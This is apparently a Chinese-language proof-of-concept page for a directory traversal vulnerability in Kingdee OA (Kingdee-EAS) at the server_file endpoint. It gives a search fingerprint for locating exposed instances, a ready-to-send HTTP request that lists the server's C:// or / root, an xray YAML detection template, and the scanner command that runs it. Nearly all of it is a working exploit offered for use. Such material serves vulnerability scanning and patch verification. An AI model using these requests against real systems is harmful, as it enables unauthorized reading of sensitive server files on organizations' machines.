# 金蝶OA server_file 目录遍历漏洞
## 漏洞描述

金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息
## 影响版本
```
金蝶OA
```

## 网络测绘
```
app="Kingdee-EAS"
```

## 环境搭建

-

## 漏洞复现

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201742057.png)


## 数据包
```
GET /appmonitor/protected/selector/server_file/files?folder=C://&suffix= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

```

## YAML代码
```
name: poc-yaml-kingdee-eas-directory-traversal
manual: true
transport: http
rules:
  r0:
    request:
      method: GET
      path: /appmonitor/protected/selector/server_file/files?folder=C://&suffix=
    expression: response.status == 200 && (response.body.bcontains(b'{"name":"Windows","path":"C:\\\\Windows","folder":true}') || response.body.bcontains(b'{"name":"root","path":"/root","folder":true}'))
  r1:
    request:
      method: GET
      path: /appmonitor/protected/selector/server_file/files?folder=/&suffix=
    expression: response.status == 200 && (response.body.bcontains(b'{"name":"Windows","path":"C:\\\\Windows","folder":true}') || response.body.bcontains(b'{"name":"root","path":"/root","folder":true}'))
expression: r0() || r1()
detail:
  author: klear
  links:
    - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E8%9D%B6OA%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
```

## xray调用

```
xraypro  ws --poc poc-yaml-kingdee-eas-traversal.yml --url xx
```

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201928254.png)
